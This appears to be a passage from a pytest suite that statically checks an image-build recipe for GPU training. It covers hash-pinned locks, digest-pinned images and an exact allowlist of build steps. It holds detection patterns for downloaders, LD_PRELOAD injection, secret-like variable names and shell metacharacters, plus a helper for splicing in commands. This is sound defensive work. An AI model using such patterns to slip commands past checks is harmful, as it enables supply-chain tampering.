"""OPE-579 GPU training lock boundary. Static file checks only: no install, network or GPU.

Passing here proves only that the lock and image recipe are isolated and hash-pinned. It is
component evidence, not GPU qualification (training/gpu/README.md).
"""

from __future__ import annotations

import json
import os
import platform
import posixpath
import re
import shlex
import shutil
import subprocess
import sys
import tomllib
from fnmatch import fnmatch
from pathlib import Path
from typing import Any

import pytest

from tools import bootstrap

ROOT = Path(__file__).resolve().parents[2]
GPU = ROOT / "training/gpu"
GPU_REL = "training/gpu"
GPU_PROJECT = "opentour-training-gpu"
CPU_LOCKS = ("uv.lock", "training/uv.lock")
GPU_ONLY_NAMES = {
    "torch",
    "triton",
    "bitsandbytes",
    "transformers",
    "peft",
    "accelerate",
    "safetensors",
}
GPU_ONLY_PREFIXES = ("nvidia-", "cuda-")
DIRECT_PINS = {
    "torch": "2.14.1",
    "transformers": "5.23.0",
    "peft": "0.21.3",
    "bitsandbytes": "0.50.2",
    "accelerate": "1.15.0",
    "safetensors": "0.8.0",
    "tokenizers": "0.23.3",
    "cuda-toolkit": "13.0.3.0",
    "nvidia-cuda-runtime": "13.0.96",
    "nvidia-cudnn-cu13": "9.24.0.43",
}
LINUX_X86_64 = "platform_machine == 'x86_64' and sys_platform == 'linux'"
DIGEST_REF = re.compile(r"^[a-z0-9./_-]+(?::[A-Za-z0-9._-]+)?@sha256:[0-9a-f]{64}$")


def toml(relative: str) -> dict:
    return tomllib.loads((ROOT / relative).read_text())


def gpu_lock() -> dict:
    return toml(f"{GPU_REL}/uv.lock")


def is_gpu_only(name: str) -> bool:
    return name in GPU_ONLY_NAMES or name.startswith(GPU_ONLY_PREFIXES)


def test_gpu_project_is_excluded_from_the_root_workspace():
    workspace = toml("pyproject.toml")["tool"]["uv"]["workspace"]
    assert not any(fnmatch(GPU_REL, pattern) for pattern in workspace["members"])
    assert "training" in workspace["exclude"]
    # uv stops at the nearest enclosing project; training/ must never become a workspace root.
    assert "workspace" not in toml("training/pyproject.toml").get("tool", {}).get("uv", {})
    assert "workspace" not in toml(f"{GPU_REL}/pyproject.toml")["tool"]["uv"]
    root_lock = toml("uv.lock")
    assert GPU_PROJECT not in root_lock["manifest"].get("members", [])
    for relative in CPU_LOCKS:
        assert GPU_PROJECT not in {p["name"] for p in toml(relative)["package"]}


def test_setup_and_control_images_never_reference_the_gpu_project():
    assert not any(path.startswith(GPU_REL) for path in (*bootstrap.LOCKS, *bootstrap.MANIFESTS))
    assert GPU_REL not in (ROOT / "justfile").read_text()
    assert GPU_REL not in (ROOT / "tools/bootstrap.py").read_text()
    # The root container context is an explicit allowlist; it must not admit the GPU lock.
    assert not any(GPU_REL in line for line in (ROOT / ".dockerignore").read_text().splitlines())
    assert (
        json.loads((ROOT / "tools/toolchain.json").read_text())["setup_boundary"]["learning_lock"]
        == "training/uv.lock"
    )


def test_gpu_lock_exists_with_hashes_for_every_artifact():
    lock = gpu_lock()
    assert lock["requires-python"] == "==3.12.16"
    assert lock["supported-markers"] == [LINUX_X86_64]
    assert lock["required-markers"] == [LINUX_X86_64]
    packages = [p for p in lock["package"] if p["name"] != GPU_PROJECT]
    assert len(packages) >= len(DIRECT_PINS)
    for package in packages:
        assert package["source"] == {"registry": "https://pypi.org/simple"}, package["name"]
        # no-build: every package must install from a hashed wheel.
        assert package["wheels"], package["name"]
        for artifact in [*package["wheels"], *([package["sdist"]] if "sdist" in package else [])]:
            assert re.fullmatch(r"sha256:[0-9a-f]{64}", artifact["hash"]), package["name"]
            assert artifact["url"].startswith("https://files.pythonhosted.org/"), package["name"]


def test_gpu_lock_pins_the_cuda_training_stack_exactly():
    project = toml(f"{GPU_REL}/pyproject.toml")
    config = project["tool"]["uv"]
    assert config["package"] is False and config["no-build"] is True
    for requirement in project["project"]["dependencies"]:
        assert re.fullmatch(r"[a-z0-9-]+(\[[a-z,]+\])?==[0-9][0-9.]*", requirement), requirement
    versions = {p["name"]: p["version"] for p in gpu_lock()["package"]}
    for name, version in DIRECT_PINS.items():
        assert versions[name] == version, name
    torch = next(p for p in gpu_lock()["package"] if p["name"] == "torch")
    assert [w["url"].rsplit("/", 1)[1] for w in torch["wheels"]] == [
        "torch-2.14.1-cp312-cp312-manylinux_2_28_x86_64.whl"
    ]
    # The CUDA runtime arrives as locked wheels, not from the control workspace.
    assert {"nvidia-cuda-runtime", "nvidia-cublas", "nvidia-cudnn-cu13"} <= set(versions)


@pytest.mark.parametrize("relative", CPU_LOCKS)
def test_no_cuda_or_torch_package_in_control_locks(relative):
    names = {p["name"] for p in toml(relative)["package"]}
    assert not {name for name in names if is_gpu_only(name)}
    assert "download.pytorch.org" not in (ROOT / relative).read_text()


def test_is_gpu_only_catches_the_gpu_lock_contents():
    """Adverse control: the denylist must flag the packages that do exist in the GPU lock."""
    flagged = {p["name"] for p in gpu_lock()["package"] if is_gpu_only(p["name"])}
    assert {"torch", "triton", "bitsandbytes", "cuda-toolkit", "nvidia-cudnn-cu13"} <= flagged


PINNED_PYTHON = "/opt/python/bin/python3.12"
# Images are written into FROM by digest; ARG selection would let `--build-arg` swap them.
BASE_IMAGE = (
    "docker.io/nvidia/cuda:13.0.3-base-ubuntu24.04"
    "@sha256:97d085a7423ee18ec483a2878b9be2c976dc4ba908aef96518beb00e1899dcc4"
)
UV_IMAGE = json.loads((ROOT / "tools/toolchain.json").read_text())["bootstrap_images"]["uv"]
EXPECTED_FROMS = [f"{UV_IMAGE} AS uv", f"{BASE_IMAGE} AS build", BASE_IMAGE]
VENV_PYTHON = "/opt/venv/bin/python"
REQUIREMENTS = "/tmp/requirements.txt"
# Every package-tool command the image may run, token for token. Anything else is refused.
ALLOWED_UV_COMMANDS = (
    ("uv", "export", "--locked", "--no-dev", "--no-emit-project", "--format", "requirements-txt")
    + ("--python", PINNED_PYTHON, "-o", REQUIREMENTS),
    ("uv", "venv", "/opt/venv", "--python", PINNED_PYTHON),
    ("uv", "pip", "install", "--python", VENV_PYTHON, "--require-hashes", "--no-deps")
    + ("--no-build", "--compile-bytecode", "-r", REQUIREMENTS),
    ("uv", "pip", "check", "--python", VENV_PYTHON),
)
COMPAT_REMOVAL = ("rm", "-rf", "/usr/local/cuda/compat", "/usr/local/cuda-13.0/compat")
COMPAT_ABSENT = ("test", "!", "-e", "/usr/local/cuda/compat")
PYTHON_VERSION_CHECK = (
    f"test \"$({PINNED_PYTHON} -c 'import platform; print(platform.python_version())')\""
    ' = "3.12.16"'
)
# The Dockerfile is fixed, so every RUN, COPY, ADD and ENV is allowlisted per stage, in order.
# Stage 0 is everything before the first FROM; stages 1-3 are uv, build and the final image.
# RUN text is compared after whitespace runs are collapsed; quoting is part of the match.
ALLOWED_RUNS: tuple[tuple[str, ...], ...] = (
    (),
    (),
    (
        "mkdir -p /opt/python && tar -xzf /tmp/cpython.tar.gz -C /opt/python"
        " --strip-components=1 && rm /tmp/cpython.tar.gz && " + PYTHON_VERSION_CHECK,
        " && ".join(" ".join(command) for command in ALLOWED_UV_COMMANDS)
        + f" && rm {REQUIREMENTS}",
    ),
    (
        " && ".join(" ".join(c) for c in (COMPAT_REMOVAL, ("ldconfig",), COMPAT_ABSENT)),
        "groupadd --gid 10001 trainer && useradd --uid 10001 --gid 10001 --create-home"
        " --home-dir /home/trainer --shell /usr/sbin/nologin trainer",
    ),
)
# Only the substitution in PYTHON_VERSION_CHECK may carry shell metacharacters. `!` is the
# `test` operand and `=` the comparison; a lone `&` (background) is refused, `&&` is not.
RUN_METACHARACTERS = re.compile(r"""[$`\\<>;|'"*?{}\[\]~#()\n]|(?<!&)&(?!&)""")
ALLOWED_COPIES: tuple[tuple[str, ...], ...] = (
    (),
    (),
    ("--from=uv /uv /usr/local/bin/uv", "pyproject.toml uv.lock ./"),
    ("--from=build /opt/python /opt/python", "--from=build /opt/venv /opt/venv"),
)
ALLOWED_ENV: tuple[tuple[tuple[str, str], ...], ...] = (
    (),
    (),
    (
        ("UV_NO_CACHE", "1"),
        ("UV_PYTHON_DOWNLOADS", "never"),
        ("UV_LINK_MODE", "copy"),
        ("UV_PYTHON", PINNED_PYTHON),
    ),
    (
        ("PATH", "/opt/venv/bin:${PATH}"),
        ("LD_LIBRARY_PATH", "/usr/local/nvidia/lib:/usr/local/nvidia/lib64"),
        ("NVIDIA_REQUIRE_CUDA", "cuda>=13.0"),
        ("PYTHONDONTWRITEBYTECODE", "1"),
        ("PYTHONUNBUFFERED", "1"),
        ("PYTHONNOUSERSITE", "1"),
        ("PYTHONSAFEPATH", "1"),
        ("HF_HOME", "/home/trainer/.cache/huggingface"),
        ("HF_HUB_OFFLINE", "1"),
        ("TRANSFORMERS_OFFLINE", "1"),
        ("HF_DATASETS_OFFLINE", "1"),
        ("HF_HUB_DISABLE_TELEMETRY", "1"),
        ("DO_NOT_TRACK", "1"),
        ("PIP_NO_INDEX", "1"),
        ("UV_OFFLINE", "1"),
        ("OPENTOUR_GPU_LOCK", "training/gpu/uv.lock"),
        ("OPENTOUR_GPU_QUALIFICATION", "NOT_RUN"),
    ),
)
# The default command only reports versions. Its exact JSON is allowlisted with ENTRYPOINT and
# WORKDIR: a start-time install, an env wrapper or an operator-mount working directory is refused.
CMD_PROGRAM = (
    "import importlib.metadata as m,json,platform; print(json.dumps({'kind':'component',"
    "'check':'gpu-trainer-image-versions','python':platform.python_version(),"
    "'versions':{p:m.version(p) for p in ('torch','transformers','peft','bitsandbytes',"
    "'accelerate','safetensors','tokenizers')},'gpu_qualification':'NOT_RUN',"
    "'product_acceptance':'NOT_RUN'}))"
)
ALLOWED_WORKDIRS: tuple[tuple[str, ...], ...] = ((), (), ("/src",), ("/home/trainer",))
ALLOWED_ENTRYPOINTS: tuple[tuple[str, ...], ...] = ((), (), (), ("[]",))
ALLOWED_CMDS: tuple[tuple[str, ...], ...] = (
    (),
    (),
    (),
    (json.dumps(["python", "-c", CMD_PROGRAM]),),
)
FINAL_LIBRARY_PATH = ("/usr/local/nvidia/lib", "/usr/local/nvidia/lib64")
ALLOWED_KEYWORDS = {"ARG", "FROM", "COPY", "ADD", "RUN", "ENV", "WORKDIR", "USER"}
ALLOWED_KEYWORDS |= {"ENTRYPOINT", "CMD"}
SECRET_SUBSTRINGS = ("TOKEN", "SECRET", "PASSWORD", "PASSWD", "CREDENTIAL", "APIKEY", "PRIVATE")
SECRET_PARTS = {"KEY", "PASS", "PAT", "AUTH", "PWD", "CREDS"}
SHELLS = {"sh", "bash", "dash", "zsh", "ksh"}
WRAPPERS = {"env", "sudo", "nice", "nohup", "exec", "command", "time", "timeout", "xargs"}
PIP_TOOLS = re.compile(r"pip[0-9.]*|pipx|easy_install|conda|mamba|micromamba|poetry|pdm|hatch")
DOWNLOADERS = re.compile(r"\b(?:curl|wget|aria2c)\b", re.I)
SYSTEM_PACKAGERS = re.compile(
    r"\b(?:apt|apt-get|aptitude|dpkg|add-apt-repository|apk|yum|dnf|microdnf|rpm)\b", re.I
)
LOADER_INJECTION = re.compile(r"\bLD_(?:PRELOAD|AUDIT)\b", re.I)
# Raw-text backstop for installs hidden in quotes or substitutions; only one may exist.
RAW_INSTALL = re.compile(r"\b(?:uv\s+)?pip[0-9.]*\s+(?:install|sync|download|wheel)\b", re.I)
RAW_PIP_MODULE = re.compile(r"-m\s*(?:pip|ensurepip)\b|\buv\s+(?:sync|add|tool|run)\b", re.I)


def is_secret_name(name: str) -> bool:
    upper = name.upper()
    return any(s in upper for s in SECRET_SUBSTRINGS) or bool(SECRET_PARTS & set(upper.split("_")))


def read_dockerfile(path: Path = GPU / "trainer.Dockerfile") -> str:
    """The bytes BuildKit reads: no newline translation (read_text() turns a lone \\r into \\n);
    bytes that are not UTF-8 survive as surrogates and are refused as non-ASCII."""
    return path.read_bytes().decode("utf-8", "surrogateescape")


# Printable ASCII and tab only, checked after one trailing \r per line is dropped (so a CRLF
# file passes). BuildKit drops every trailing \r; a second one is still refused here.
DOCKERFILE_FORBIDDEN = re.compile(r"[^\t\x20-\x7e]")
# BuildKit's line model, rule for rule (frontend/dockerfile/parser/parser.go, the same in every
# release checked: v0.11.6, v0.12.5, v0.15.2, v0.18.2, v0.21.1, v0.24.0 and master). Lines split
# on \n only (scanLines), every trailing \r is dropped (trimNewline), and every trim and blank
# test uses Go's unicode.IsSpace, which, unlike Python's str.strip(), leaves \x1c-\x1f alone.
GO_SPACE = (
    "\t\n\v\f\r \x85\xa0\u1680\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009"
    "\u200a\u2028\u2029\u202f\u205f\u3000"
)
# BuildKit's continuation regex for the default escape `\`, used both to test a line and to trim
# it: `\` continues a line only after a character other than `\`, or alone on the line. So an
# escaped backslash (`foo \\`) ends the instruction, and group 1 is what the trim keeps.
CONTINUATION = re.compile(r"([^\\])\\[ \t]*\Z|\A\\[ \t]*\Z")
# BuildKit's reWhitespace: splitCommand splits the keyword off with it, and the arguments of
# FROM, COPY, ADD and the like are split with it. Python's str.split() also splits on \x1c-\x1f.
BLANKS = re.compile(r"[\t\v\f\r ]+")
# Parser directives. parser.DetectSyntax, which picks the frontend image that builds the file,
# also takes `//syntax=` or a JSON document, and reads past a byte-order mark and a `#!` line.
# Matched on every line, so a directive anywhere is refused, not only where BuildKit reads one.
DIRECTIVE = re.compile(r"^\s*(?:#|//)\s*(?:escape|syntax|check)\s*=", re.I | re.M)


def go_trim_left(text: str) -> str:
    return text.lstrip(GO_SPACE)


def go_trim_space(text: str) -> str:
    return text.strip(GO_SPACE)


def continuation(line: str) -> tuple[str, bool]:
    """BuildKit's trimContinuationCharacter: (the line without a trailing `\\`, continued)."""
    if CONTINUATION.search(line):
        return CONTINUATION.sub(r"\1", line), True
    return line, False


def has_parser_directive(text: str) -> bool:
    body = text.removeprefix("\ufeff")
    if DIRECTIVE.search(body):
        return True
    if body.startswith("#!"):
        body = body.partition("\n")[2]
    try:
        document = json.loads(body)
    except (ValueError, RecursionError):
        return False
    return isinstance(document, dict) and any(str(key).lower() == "syntax" for key in document)


def dockerfile_instructions(text: str) -> tuple[list[str], list[str]]:
    """Return (hazards, instructions): each instruction joined exactly as BuildKit's parser
    joins it and trimmed as splitCommand trims it. Constructs BuildKit accepts but that only
    obscure what it builds are hazards; the join still follows BuildKit through them."""
    hazards: list[str] = []
    # BuildKit splits lines on \n only. str.splitlines() also breaks on \r, \v, \f,
    # \x1c-\x1e, \x85, U+2028 and U+2029, which BuildKit keeps inside the line, so a `#` after
    # one of them would look like a comment here and run as shell there.
    physical = text.split("\n")
    if any(DOCKERFILE_FORBIDDEN.search(line.removesuffix("\r")) for line in physical):
        hazards.append("dockerfile_non_ascii_or_control")
    if physical[-1] == "":
        physical.pop()  # what follows the final \n is not a line
    lines = [line.rstrip("\r") for line in physical]
    if lines:
        lines[0] = lines[0].removeprefix("\ufeff")  # discardBOM
    instructions: list[str] = []
    index = 0
    while index < len(lines):
        # An instruction's first line is trimmed on the left, and a comment there is no line.
        first = go_trim_left(lines[index])
        index += 1
        if first.startswith("#"):
            continue
        if go_trim_space(first) == "\\":
            hazards.append("dockerfile_lone_continuation_line")
        joined, continued = continuation(first)
        if not continued and not joined:
            continue
        while continued and index < len(lines):
            line = lines[index]
            index += 1
            if go_trim_left(line).startswith("#"):
                # BuildKit skips a comment line inside a continuation. The real file has none.
                hazards.append("dockerfile_comment_in_continuation")
                continue
            if not go_trim_left(line):
                # BuildKit skips an empty or blank line inside a continuation and keeps joining,
                # so `WORKDIR /x \` + blank line swallows the next instruction (for example
                # USER). Refused; the skip is still emulated so the other checks see what
                # BuildKit builds.
                hazards.append("dockerfile_empty_continuation_line")
                continue
            if go_trim_space(line) == "\\":
                # BuildKit's trim drops a lone `\`, so the line adds nothing but obscures the join.
                hazards.append("dockerfile_lone_continuation_line")
            piece, continued = continuation(line)
            # BuildKit appends a continued line verbatim: no space is added, so `A="x"\` followed
            # by an unindented `B=y` is the single word `A=xB=y` and B is never set. Refused,
            # and joined exactly as BuildKit does so the allowlists compare what it builds.
            if joined[-1:] not in ("", " ", "\t") and piece[:1] not in ("", " ", "\t"):
                hazards.append("dockerfile_continuation_without_separator")
            joined += piece
        if continued:
            # BuildKit builds a file that ends inside a continuation; it is refused here.
            hazards.append("dangling_continuation")
        instructions.append(go_trim_space(joined))
    return hazards, instructions


def parse_dockerfile(text: str) -> tuple[list[str], list[dict]]:
    """Return (hazards, stages). Keywords are case-insensitive; continuations are joined and
    comment lines inside them dropped, as BuildKit does. Each stage lists its instructions."""
    hazards: list[str] = []
    if has_parser_directive(text):
        hazards.append("parser_directive")
    line_hazards, joined = dockerfile_instructions(text)
    hazards += line_hazards
    stages: list[dict] = [{"from": None, "steps": []}]
    for raw in joined:
        # BuildKit splits the keyword on ASCII blanks; a tab after RUN is still RUN.
        keyword, args = (BLANKS.split(raw, maxsplit=1) + [""])[:2]
        # str.upper() folds some non-ASCII letters to ASCII (\u017f -> S); BuildKit does not.
        if not keyword.isascii():
            hazards.append("instruction_not_allowed")
        keyword = keyword.upper()
        args = go_trim_space(args)
        if keyword not in ALLOWED_KEYWORDS:
            hazards.append("instruction_not_allowed")
        if "<<" in args and keyword in {"RUN", "COPY", "ADD"}:
            hazards.append("heredoc_not_allowed")
        if keyword == "FROM":
            stages.append({"from": args, "steps": []})
        # Collapse whitespace left by joined continuations; RUN and ENV are re-split later and
        # the exec-form CMD/ENTRYPOINT JSON is compared verbatim.
        verbatim = keyword in {"RUN", "ENV", "CMD", "ENTRYPOINT"}
        stages[-1]["steps"].append((keyword, args if verbatim else " ".join(BLANKS.split(args))))
    return hazards, stages


def normalize_run(args: str) -> str:
    # Only what the shell itself treats as a blank between words is collapsed.
    return " ".join(re.split(r"[ \t]+", args.strip(" \t")))


def stage_args(stages: list[dict[str, Any]], keyword: str) -> list[list[str]]:
    return [[a for k, a in stage["steps"] if k == keyword] for stage in stages]


def split_from(per_stage: list[list[str]], want: bool) -> list[list[str]]:
    """Keep only the COPY operands that do (want=True) or do not read another image/stage."""
    return [[a for a in s if bool(re.match(r"--from\b", a, re.I)) == want] for s in per_stage]


def env_assignments(args: str) -> list[tuple[str, str]]:
    """ENV operands, both `NAME=value ...` and the legacy `NAME value` form; quotes removed."""
    try:
        tokens = shlex.split(args, posix=True)
    except ValueError:
        return [("__UNPARSEABLE__", args)]
    if tokens and "=" not in tokens[0]:
        return [(tokens[0], " ".join(tokens[1:]))]
    # A bare word in the NAME=value form is a BuildKit syntax error; keep it so it is refused.
    return [
        (name, value) if sep else ("__UNPARSEABLE__", token)
        for token in tokens
        for name, sep, value in [token.partition("=")]
    ]


def simple_commands(script: str) -> list[list[str]] | None:
    """Split a RUN shell script into simple commands on &&, ||, ;, |, & and parentheses."""
    lexer = shlex.shlex(script, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    commands: list[list[str]] = [[]]
    try:
        for token in lexer:
            if token and set(token) <= set("&|;()<>"):
                commands.append([])
            else:
                commands[-1].append(token)
    except ValueError:
        return None
    return [command for command in commands if command]


def command_hazards(command: list[str], depth: int = 0) -> list[str]:
    hazards: list[str] = []
    index = 0
    while index < len(command) and re.fullmatch(r"\w+=.*", command[index]):
        index += 1  # leading VAR=value assignments
    wrapped = False
    while index < len(command) and Path(command[index]).name in WRAPPERS:
        wrapped = True
        index += 1
        while index < len(command) and command[index].startswith("-"):
            index += 1
    if index >= len(command):
        return hazards
    tokens = tuple(command[index:])
    program = Path(tokens[0]).name
    if program in SHELLS and "-c" in tokens and depth < 3:
        script = tokens[tokens.index("-c") + 1] if tokens.index("-c") + 1 < len(tokens) else ""
        for inner in simple_commands(script) or [["__UNPARSEABLE__"]]:
            hazards += command_hazards(inner, depth + 1)
    elif program in SHELLS and len(tokens) > 1:
        hazards.append("shell_runs_file")
    elif program == "uv":
        if wrapped or tokens not in ALLOWED_UV_COMMANDS:
            hazards.append("package_command_not_allowed")
    elif PIP_TOOLS.fullmatch(program):
        hazards.append("package_command_not_allowed")
    elif re.fullmatch(r"python[0-9.]*", program) and "-m" in tokens:
        hazards.append("package_command_not_allowed")
    elif tokens[0].startswith(("./", "/tmp/")):
        hazards.append("shell_runs_file")
    elif program == "__UNPARSEABLE__":
        hazards.append("unparseable_run")
    return hazards


def image_hazards(text: str) -> list[str]:
    hazards, stages = parse_dockerfile(text)
    final = stages[-1]
    all_steps = [step for stage in stages for step in stage["steps"]]
    run_scripts = [args for keyword, args in all_steps if keyword == "RUN"]
    run_text = "\n".join(run_scripts)
    if DOWNLOADERS.search(run_text):
        hazards.append("download_in_run")
    if SYSTEM_PACKAGERS.search(run_text):
        hazards.append("system_package_tool")
    if len(RAW_INSTALL.findall(run_text)) != 1 or RAW_PIP_MODULE.search(run_text):
        hazards.append("package_command_not_allowed")
    for script in run_scripts:
        if script.startswith("["):
            try:
                script = shlex.join(json.loads(script))
            except (ValueError, TypeError):
                hazards.append("unparseable_run")
                continue
        commands = simple_commands(script)
        if commands is None:
            hazards.append("unparseable_run")
            continue
        for command in commands:
            hazards += command_hazards(command)
    if any(LOADER_INJECTION.search(args) for _, args in all_steps):
        hazards.append("loader_injection")
    names = [
        args.split("=", 1)[0].split()[0] for keyword, args in all_steps if keyword == "ARG" and args
    ]
    names += [
        name for keyword, args in all_steps if keyword == "ENV" for name, _ in env_assignments(args)
    ]
    if any(is_secret_name(name) for name in names):
        hazards.append("secret_like_build_variable")
    # The final stage's own ENV is the only thing that overrides the base image's environment.
    final_env = [
        pair
        for keyword, args in final["steps"]
        if keyword == "ENV"
        for pair in env_assignments(args)
    ]
    library_values = [value for name, value in final_env if name == "LD_LIBRARY_PATH"]
    if not library_values or any("$" in value for value in library_values):
        hazards.append("library_path_inherited")
    for value in library_values:
        entries = re.split(r"[:;]", value.strip("\"'"))
        normalized = [posixpath.normpath(re.sub(r"/+", "/", entry)) for entry in entries]
        if any(not entry or not entry.startswith("/") for entry in entries):
            hazards.append("library_path_relative")
        if any(
            path.startswith("/usr/local/cuda")
            or path == "/usr/lib/x86_64-linux-gnu"
            or path.startswith("/usr/lib/x86_64-linux-gnu/")
            for path in normalized
        ):
            hazards.append("system_cuda_on_library_path")
        if tuple(normalized) != FINAL_LIBRARY_PATH:
            hazards.append("library_path_not_allowlisted")
    require = [value for name, value in final_env if name == "NVIDIA_REQUIRE_CUDA"]
    if require != ["cuda>=13.0"] or re.search(r"NVIDIA_DISABLE_REQUIRE", text, re.I):
        hazards.append("driver_floor_not_enforced")
    final_commands = [
        tuple(command)
        for keyword, args in final["steps"]
        if keyword == "RUN"
        for command in simple_commands(args) or []
    ]
    if COMPAT_REMOVAL not in final_commands or COMPAT_ABSENT not in final_commands:
        hazards.append("compat_libcuda_present")
    # The removal must be the final state: no COPY or ADD after it may put compat back.
    removals = [
        index
        for index, (keyword, args) in enumerate(final["steps"])
        if keyword == "RUN"
        and {COMPAT_REMOVAL, COMPAT_ABSENT} <= {tuple(c) for c in simple_commands(args) or []}
    ]
    last_copy = max(
        (index for index, (keyword, _) in enumerate(final["steps"]) if keyword in {"COPY", "ADD"}),
        default=-1,
    )
    if removals and removals[-1] < last_copy:
        hazards.append("compat_restored_after_removal")
    python = json.loads((ROOT / "tools/toolchain.json").read_text())["tools"]["python"]
    python = python["artifacts"]["Linux-x86_64"]
    add = f"--checksum=sha256:{python['sha256']} {python['url']} /tmp/cpython.tar.gz"
    if stage_args(stages, "ADD") != [[], [], [add], []]:
        hazards.append("add_not_pinned")
    # COPY --from reads another image or stage, so its sources are allowlisted like FROM.
    copies = stage_args(stages, "COPY")
    expected_copies = [list(stage) for stage in ALLOWED_COPIES]
    if split_from(copies, True) != split_from(expected_copies, True):
        hazards.append("copy_from_not_allowed")
    if split_from(copies, False) != split_from(expected_copies, False):
        hazards.append("copy_not_allowed")
    runs = stage_args(stages, "RUN")
    if any(script.startswith("--") for stage in runs for script in stage):
        hazards.append("run_flags_not_allowed")  # --mount, --network, --security, ...
    if [[normalize_run(s) for s in stage] for stage in runs] != [list(s) for s in ALLOWED_RUNS]:
        hazards.append("run_not_allowlisted")
    for stage in runs:
        for script in stage:
            residue = normalize_run(script).replace(PYTHON_VERSION_CHECK, "", 1)
            if RUN_METACHARACTERS.search(residue):
                hazards.append("run_shell_metacharacter")
    stage_env = [
        [pair for keyword, a in stage["steps"] if keyword == "ENV" for pair in env_assignments(a)]
        for stage in stages
    ]
    if stage_env != [list(stage) for stage in ALLOWED_ENV]:
        hazards.append("env_not_allowlisted")
    for keyword, allowed, hazard in (
        ("WORKDIR", ALLOWED_WORKDIRS, "workdir_not_allowlisted"),
        ("ENTRYPOINT", ALLOWED_ENTRYPOINTS, "entrypoint_not_allowlisted"),
        ("CMD", ALLOWED_CMDS, "cmd_not_allowlisted"),
    ):
        if stage_args(stages, keyword) != [list(stage) for stage in allowed]:
            hazards.append(hazard)
    froms = [stage["from"] for stage in stages[1:]]
    if froms != EXPECTED_FROMS:
        hazards.append("from_not_pinned")
    for args in froms:
        if "$" in args:
            hazards.append("from_uses_variable")
        reference = next((tok for tok in args.split() if not tok.startswith("--")), "")
        if not DIGEST_REF.fullmatch(reference):
            hazards.append("from_not_digest_pinned")
    # An ARG declared before the first FROM is the only kind a FROM line can expand.
    global_args = [
        a.split("=", 1)[0].split()[0] for keyword, a in stages[0]["steps"] if keyword == "ARG" and a
    ]
    if any(
        re.search(rf"\$\{{?{re.escape(name)}\b", args) for name in global_args for args in froms
    ):
        hazards.append("from_selected_by_arg")
    users = [args for stage in stages for keyword, args in stage["steps"] if keyword == "USER"]
    final_keywords = [keyword for keyword, _ in final["steps"]]
    if (
        users != ["10001:10001"]
        or "USER" not in final_keywords
        or "RUN" in final_keywords[final_keywords.index("USER") :]
    ):
        hazards.append("not_final_non_root_user")
    return sorted(set(hazards))


def test_trainer_image_installs_only_from_the_hashed_lock_as_non_root():
    text = read_dockerfile()
    toolchain = json.loads((ROOT / "tools/toolchain.json").read_text())
    _, stages = parse_dockerfile(text)
    steps = [step for stage in stages for step in stage["steps"]]
    # No ARG at all: nothing a `--build-arg` could change.
    assert [a for keyword, a in steps if keyword == "ARG"] == []
    assert DIGEST_REF.fullmatch(BASE_IMAGE) and DIGEST_REF.fullmatch(UV_IMAGE)
    # The base flavour carries no cuBLAS/NCCL that could shadow the locked wheels.
    assert BASE_IMAGE.startswith("docker.io/nvidia/cuda:13.0.3-base-ubuntu24.04@sha256:")
    assert UV_IMAGE == toolchain["bootstrap_images"]["uv"]
    assert "TODO" not in text
    assert [stage["from"] for stage in stages[1:]] == EXPECTED_FROMS
    # ADD, COPY and FROM inventories are enforced in image_hazards.
    run_commands = [
        tuple(command)
        for keyword, a in steps
        if keyword == "RUN"
        for command in simple_commands(a) or []
    ]
    # Every allowed package-tool command is present exactly once, in order.
    uv_commands = [command for command in run_commands if command[0] == "uv"]
    assert uv_commands == list(ALLOWED_UV_COMMANDS)
    # The RUN allowlist is the same text, so the two inventories cannot drift apart.
    allowed = [tuple(c) for stage in ALLOWED_RUNS for r in stage for c in simple_commands(r) or []]
    assert allowed == run_commands
    assert [c for c in allowed if c[0] == "uv"] == list(ALLOWED_UV_COMMANDS)
    final_env = dict(
        pair
        for keyword, a in stages[-1]["steps"]
        if keyword == "ENV"
        for pair in env_assignments(a)
    )
    for name in ("HF_HUB_OFFLINE", "TRANSFORMERS_OFFLINE", "PIP_NO_INDEX"):
        assert final_env[name] == "1"
    assert final_env["OPENTOUR_GPU_QUALIFICATION"] == "NOT_RUN"
    assert final_env["NVIDIA_REQUIRE_CUDA"] == "cuda>=13.0"
    assert final_env["LD_LIBRARY_PATH"] == ":".join(FINAL_LIBRARY_PATH)
    assert final_env["PYTHONSAFEPATH"] == "1"
    assert json.loads(ALLOWED_CMDS[-1][0]) == ["python", "-c", CMD_PROGRAM]
    # Bytes, not lines: BuildKit reads .dockerignore with the same \n-only line rule.
    assert (GPU / ".dockerignore").read_bytes() == b"**\n!pyproject.toml\n!uv.lock\n"


def test_trainer_image_has_no_hazard():
    assert image_hazards(read_dockerfile()) == []


def test_whole_file_crlf_is_accepted() -> None:
    """Positive control: BuildKit drops one trailing \\r per line, so CRLF is the same file."""
    assert image_hazards(read_dockerfile().replace("\n", "\r\n")) == []


def test_reader_keeps_bytes_that_read_text_would_translate(tmp_path: Path) -> None:
    source = read_dockerfile().replace(
        COMPAT_TAIL, COMPAT_TAIL.removesuffix("\n") + "\r" + COMPAT_PAYLOAD + "\n"
    )
    path = tmp_path / "trainer.Dockerfile"
    path.write_bytes(source.encode())
    assert "\r" in read_dockerfile(path)
    assert "dockerfile_non_ascii_or_control" in image_hazards(read_dockerfile(path))
    path.write_bytes(read_dockerfile().encode() + b"# \xff\n")
    assert "dockerfile_non_ascii_or_control" in image_hazards(read_dockerfile(path))


LD = "    LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64 \\\n"
INSTALL = "      --compile-bytecode -r /tmp/requirements.txt \\\n"
WORKDIR = "WORKDIR /home/trainer\n"


def ld(value: str) -> tuple[tuple[str, str], ...]:
    return ((LD, f"    LD_LIBRARY_PATH={value} \\\n"),)


def chain(command: str) -> tuple[tuple[str, str], ...]:
    return ((INSTALL, INSTALL + f" && {command} \\\n"),)


def before_workdir(line: str) -> tuple[tuple[str, str], ...]:
    return ((WORKDIR, line + "\n" + WORKDIR),)


COMPAT_RUN = (
    "RUN rm -rf /usr/local/cuda/compat /usr/local/cuda-13.0/compat \\\n"
    " && ldconfig \\\n"
    " && test ! -e /usr/local/cuda/compat\n"
)
FINAL_COPIES = "COPY --from=build /opt/python /opt/python\nCOPY --from=build /opt/venv /opt/venv\n"
OBFUSCATED = ("run_not_allowlisted", "run_shell_metacharacter")
LOCK_COPY = "COPY pyproject.toml uv.lock ./\n"
